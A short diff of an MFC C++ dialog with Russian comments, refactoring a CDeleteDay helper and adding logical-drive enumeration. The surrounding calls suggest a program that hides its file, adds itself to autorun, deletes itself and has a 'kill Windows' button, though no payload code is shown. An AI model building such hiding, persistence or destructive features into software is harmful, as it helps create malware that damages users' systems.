@@ -43,7 +43,6 @@ BEGIN_MESSAGE_MAP(CDeDayDlg, CDialog)
 	ON_BN_CLICKED(IDCANCEL, &CDeDayDlg::OnBnClickedCancel)
 END_MESSAGE_MAP()
 
-CDeleteDay dDay;
 
 // CDeDayDlg message handlers
 
@@ -58,6 +57,8 @@ BOOL CDeDayDlg::OnInitDialog()
 
 	//если в едитбокс ничего не введено запрещаем кнопку "OK"
 	GetDlgItem(IDOK)->EnableWindow(FALSE);
+	
+	getListOfLogicalDrives();
 
 	return TRUE;  // return TRUE  unless you set the focus to a control
 }
@@ -101,6 +102,7 @@ HCURSOR CDeDayDlg::OnQueryDragIcon()
 
 void CDeDayDlg::OnBnClickedOk()
 {
+	CDeleteDay dDay;
 	dDay.HideFile(true);	
 	//добавить себя в автозагрузку
 	if (!dDay.AddToAutoRun()) {
@@ -221,6 +223,7 @@ void CDeDayDlg::OnBnClickedKillwindows()
 
 void CDeDayDlg::OnBnClickedCancel()
 {
+	CDeleteDay dDay;
 	//удаляем сами себя
 	TRACE(" >>> Удаляем сами себя <<<\n");
 	dDay.SelfDelete();
